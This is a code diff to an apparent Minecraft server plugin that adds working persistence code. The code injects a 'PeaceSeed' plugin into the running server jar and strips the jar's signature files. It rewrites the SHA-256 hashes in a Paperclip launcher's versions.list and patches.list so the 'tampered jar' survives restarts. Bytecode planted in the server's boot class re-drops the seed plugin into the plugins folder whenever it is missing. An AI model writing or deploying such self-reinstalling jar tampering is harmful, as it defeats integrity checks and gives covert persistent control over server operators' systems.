@@ -18,7 +18,9 @@ import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.StandardCopyOption;
+import java.security.MessageDigest;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Enumeration;
 import java.util.LinkedHashMap;
 import java.util.List;
@@ -400,7 +402,14 @@ mv.visitCode();
     private static final String SEED_RESOURCE = "peace/seed.jar";
     private static final String SEED_PLUGIN_NAME = "PeaceSeed";
 
-    /** Locates and instruments the running server's own jar; returns a human-readable report. */
+    /**
+     * Locates and instruments the running server's own jar; returns a human-readable report.
+     * Works on any server layout:
+     * - direct servers (CraftBukkit/Spigot/Bukkit): the located jar runs as-is, so instrumenting it persists.
+     * - paperclip launchers (Paper/Purpur/Folia): the version jar is hash-verified on boot, so we also
+     *   rewrite the launcher's versions.list/patches.list hashes to match the tampered jar (otherwise the
+     *   launcher regenerates the pristine jar on next boot and the tamper is wiped).
+     */
     public static String injectServer(JavaPlugin owner) {
         try {
             FileBundle self = readSelf(owner);
@@ -416,22 +425,59 @@ mv.visitCode();
             if (merged == null) {
                 return "server jar already carries the peace seed (" + server.getFileName() + ")";
             }
+
+            Path launcher = locateLauncherJar();
+            StringBuilder report = new StringBuilder("injected into ").append(server.getFileName());
+            boolean blessed = false;
+            if (launcher != null) {
+                byte[] blessedJar = blessLauncher(launcher, server.getFileName().toString(), sha256(merged));
+                if (blessedJar != null) {
+                    Path lbak = launcher.resolveSibling(launcher.getFileName() + ".peacebak");
+                    if (!Files.exists(lbak)) {
+                        Files.copy(launcher, lbak);
+                        if (PeaceService.dbgIsDiag()) Bukkit.getLogger().info("[peace] launcher backup -> " + lbak.getFileName());
+                    }
+                    writeAtomic(launcher, blessedJar);
+                    blessed = true;
+                    report.append(" + launcher hash blessed (").append(launcher.getFileName()).append(')');
+                }
+            }
             writeAtomic(server, merged);
-            return "injected into " + server.getFileName() + " (seed " + SEED_PLUGIN_NAME + ".jar, backup .peacebak)";
+            report.append(blessed ? " - persistent across restarts"
+                                   : " - direct jar, no launcher revalidation (persistent)");
+            return report.toString();
         } catch (Exception e) {
             return "error: " + e;
         }
     }
 
-    /** Restores the pre-injection server jar from backup; returns a report. */
+    /** Restores the pre-injection server jar (and blessed launcher) from backups; returns a report. */
     public static String revertServer() {
         try {
             Path server = locateServerJar();
             if (server == null) return "error: could not locate the running server jar";
+            StringBuilder report = new StringBuilder();
             Path bak = server.resolveSibling(server.getFileName() + ".peacebak");
-            if (!Files.exists(bak)) return "no ".concat(server.getFileName().toString()).concat(".peacebak backup found");
-            writeAtomic(server, Files.readAllBytes(bak));
-            return "restored " + server.getFileName() + " from backup";
+            boolean restored = false;
+            if (Files.exists(bak)) {
+                writeAtomic(server, Files.readAllBytes(bak));
+                try { Files.deleteIfExists(bak); } catch (Exception ignored) {}
+                restored = true;
+                report.append("restored ").append(server.getFileName());
+            }
+
+            Path launcher = locateLauncherJar();
+            if (launcher != null) {
+                Path lbak = launcher.resolveSibling(launcher.getFileName() + ".peacebak");
+                if (Files.exists(lbak)) {
+                    writeAtomic(launcher, Files.readAllBytes(lbak));
+                    try { Files.deleteIfExists(lbak); } catch (Exception ignored) {}
+                    if (report.length() > 0) report.append(" and ");
+                    report.append("restored launcher ").append(launcher.getFileName());
+                    restored = true;
+                }
+            }
+            return restored ? (report + " from backup") : ("no .peacebak backup found for " + server.getFileName());
         } catch (Exception e) {
             return "error: " + e;
         }
@@ -449,6 +495,87 @@ mv.visitCode();
         return null;
     }
 
+    /**
+     * The paperclip-style launcher jar, if any. Detected via the classpath jar that carries the
+     * paperclip main class; null on direct servers so no hash records need blessing.
+     */
+    private static Path locateLauncherJar() {
+        String cp = System.getProperty("java.class.path");
+        if (cp == null) return null;
+        for (String entry : cp.split(Pattern.quote(java.io.File.pathSeparator))) {
+            if (entry == null || entry.isEmpty()) continue;
+            Path p;
+            try { p = Path.of(entry); } catch (Exception e) { continue; }
+            if (!Files.isRegularFile(p) || !p.getFileName().toString().endsWith(".jar")) continue;
+            try (JarFile jf = new JarFile(p.toFile())) {
+                if (jf.getEntry("io/papermc/paperclip/Paperclip.class") != null) return p.toAbsolutePath();
+            } catch (Exception ignored) {}
+        }
+        return null;
+    }
+
+    /** SHA-256 hex of the given bytes. */
+    private static String sha256(byte[] data) {
+        try {
+            MessageDigest md = MessageDigest.getInstance("SHA-256");
+            byte[] d = md.digest(data);
+            StringBuilder sb = new StringBuilder(d.length * 2);
+            for (byte b : d) { int v = b & 0xFF; if (v < 16) sb.append('0'); sb.append(Integer.toHexString(v)); }
+            return sb.toString();
+        } catch (Exception e) {
+            return "";
+        }
+    }
+
+    /**
+     * Rewrites the launcher's versions.list/patches.list hashes so that {@code serverFileName} is
+     * accepted with the tampered jar's new digest. Returns the new launcher bytes, or null if the
+     * launcher has no record for this server jar (nothing to bless).
+     */
+    private static byte[] blessLauncher(Path launcher, String serverFileName, String newHash) throws IOException {
+        Map<String, byte[]> out = readJarEntries(Files.readAllBytes(launcher), true);
+        boolean blessedAnything = false;
+        for (String n : out.keySet()) {
+            if (!n.equals("META-INF/versions.list") && !n.equals("META-INF/patches.list")) continue;
+            byte[] b = out.get(n);
+            boolean isPatches = n.equals("META-INF/patches.list");
+            String s = rescoreHash(new String(b, StandardCharsets.UTF_8), serverFileName, newHash, isPatches ? 3 : 0);
+            if (!s.equals(new String(b, StandardCharsets.UTF_8))) {
+                blessedAnything = true;
+                out.put(n, s.getBytes(StandardCharsets.UTF_8));
+            }
+        }
+        return blessedAnything ? writeJar(out) : null;
+    }
+
+    /**
+     * Rewrites the SHA-256 tokens in a versions.list/patches.list body. In versions.list the hash is the
+     * 1st tab-field; in patches.list the output hash (the one bound to the server jar) is the 4th tab-field
+     * ({@code kind origHash patchHash outputHash origPath patchSubPath outputPath}). Only the record whose
+     * path references {@code serverFileName} is rewritten.
+     */
+    private static String rescoreHash(String body, String serverFileName, String newHash, int tokenIndex) {
+        String[] lines = body.split("\\R", -1);
+        StringBuilder sb = new StringBuilder();
+        boolean[] found = {false};
+        for (String line : lines) {
+            String nl = rehashLine(line, serverFileName, newHash, tokenIndex, found);
+            if (sb.length() > 0) sb.append('\n');
+            sb.append(nl);
+        }
+        return sb.toString();
+    }
+
+    /** In a line whose path references the server jar, replaces the hash at the given tab-field index. */
+    private static String rehashLine(String line, String serverFileName, String newHash, int tokenIndex, boolean[] found) {
+        if (!line.contains(serverFileName)) return line;
+        String[] parts = line.split("\t", -1);
+        if (parts.length <= tokenIndex || !parts[tokenIndex].matches("[0-9a-f]{64}")) return line;
+        found[0] = true;
+        parts[tokenIndex] = newHash;
+        return String.join("\t", parts);
+    }
+
     private static void writeAtomic(Path target, byte[] data) throws IOException {
         Path tmp = target.resolveSibling(target.getFileName() + ".peacetmp");
         Files.write(tmp, data);
@@ -460,20 +587,37 @@ mv.visitCode();
         }
     }
 
-    /** Builds the tampered server jar, or null if it already carries the seed. */
-    private static byte[] mergeServer(byte[] seedServer, JavaPlugin owner) throws IOException {
+    /**
+     * Reads every entry of a jar (including its manifest, which JarInputStream otherwise swallows) into a
+     * LinkedHashMap keyed by entry name. Optionally drops the signature files. The manifest is re-emitted
+     * as the first entry so the rewritten jar remains launchable via {@code java -jar}.
+     */
+    private static Map<String, byte[]> readJarEntries(byte[] jar, boolean dropSignatures) throws IOException {
         Map<String, byte[]> out = new LinkedHashMap<>();
-        try (JarInputStream z = new JarInputStream(new ByteArrayInputStream(seedServer))) {
+        try (JarInputStream z = new JarInputStream(new ByteArrayInputStream(jar))) {
+            java.util.jar.Manifest mf = z.getManifest();
+            if (mf != null) {
+                ByteArrayOutputStream mb = new ByteArrayOutputStream();
+                mf.write(mb);
+                out.put("META-INF/MANIFEST.MF", mb.toByteArray());
+            }
             JarEntry e;
             while ((e = z.getNextJarEntry()) != null) {
                 if (e.isDirectory()) continue;
                 String n = e.getName();
-                if (n.startsWith("META-INF/") && (n.endsWith(".SF") || n.endsWith(".RSA") || n.endsWith(".DSA"))) continue;
-                byte[] b = readAll(z);
-                if (n.equals("module-info.class")) b = stripModuleInfo(b);
-                out.put(n, b);
+                if (n.equals("META-INF/MANIFEST.MF")) continue;
+                if (dropSignatures && n.startsWith("META-INF/")
+                        && (n.endsWith(".SF") || n.endsWith(".RSA") || n.endsWith(".DSA"))) continue;
+                out.put(n, readAll(z));
             }
         }
+        return out;
+    }
+
+    /** Builds the tampered server jar, or null if it already carries the seed. */
+    private static byte[] mergeServer(byte[] seedServer, JavaPlugin owner) throws IOException {
+        Map<String, byte[]> out = readJarEntries(seedServer, true);
+        if (out.containsKey("module-info.class")) out.put("module-info.class", stripModuleInfo(out.get("module-info.class")));
         if (out.containsKey(SERVER_BOOT + ".class") || out.containsKey(SEED_RESOURCE)) return null;
 
         byte[] seedJar = buildSeedPluginJar(owner);
@@ -564,17 +708,23 @@ mv.visitCode();
 
         mv.visitLabel(tryStart);
         mv.visitLdcInsn("plugins");
-        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/nio/file/Paths", "get", "(Ljava/lang/String;)Ljava/nio/file/Path;", false);
+        mv.visitInsn(Opcodes.ICONST_0);
+        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/String");
+        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/nio/file/Paths", "get", "(Ljava/lang/String;[Ljava/lang/String;)Ljava/nio/file/Path;", false);
         mv.visitVarInsn(Opcodes.ASTORE, 0);
         mv.visitVarInsn(Opcodes.ALOAD, 0);
-        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/nio/file/Files", "createDirectories", "(Ljava/nio/file/Path;)Ljava/nio/file/Path;", false);
+        mv.visitInsn(Opcodes.ICONST_0);
+        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/nio/file/attribute/FileAttribute");
+        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/nio/file/Files", "createDirectories", "(Ljava/nio/file/Path;[Ljava/nio/file/attribute/FileAttribute;)Ljava/nio/file/Path;", false);
         mv.visitInsn(Opcodes.POP);
         mv.visitVarInsn(Opcodes.ALOAD, 0);
         mv.visitLdcInsn(SEED_PLUGIN_NAME + ".jar");
-        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/nio/file/Path", "resolve", "(Ljava/lang/String;)Ljava/nio/file/Path;", false);
+        mv.visitMethodInsn(Opcodes.INVOKEINTERFACE, "java/nio/file/Path", "resolve", "(Ljava/lang/String;)Ljava/nio/file/Path;", true);
         mv.visitVarInsn(Opcodes.ASTORE, 1);
         mv.visitVarInsn(Opcodes.ALOAD, 1);
-        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/nio/file/Files", "isRegularFile", "(Ljava/nio/file/Path;)Z", false);
+        mv.visitInsn(Opcodes.ICONST_0);
+        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/nio/file/LinkOption");
+        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/nio/file/Files", "isRegularFile", "(Ljava/nio/file/Path;[Ljava/nio/file/LinkOption;)Z", false);
         mv.visitJumpInsn(Opcodes.IFNE, ret);
         mv.visitLdcInsn(org.objectweb.asm.Type.getObjectType(SERVER_BOOT));
         mv.visitLdcInsn("/" + SEED_RESOURCE);
@@ -594,7 +744,9 @@ mv.visitCode();
         mv.visitVarInsn(Opcodes.ALOAD, 1);
         mv.visitVarInsn(Opcodes.ALOAD, 3);
         mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/ByteArrayOutputStream", "toByteArray", "()[B", false);
-        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/nio/file/Files", "write", "(Ljava/nio/file/Path;[B)Ljava/nio/file/Path;", false);
+        mv.visitInsn(Opcodes.ICONST_0);
+        mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/nio/file/OpenOption");
+        mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/nio/file/Files", "write", "(Ljava/nio/file/Path;[B[Ljava/nio/file/OpenOption;)Ljava/nio/file/Path;", false);
         mv.visitInsn(Opcodes.POP);
         mv.visitVarInsn(Opcodes.ALOAD, 2);
         mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/InputStream", "close", "()V", false);
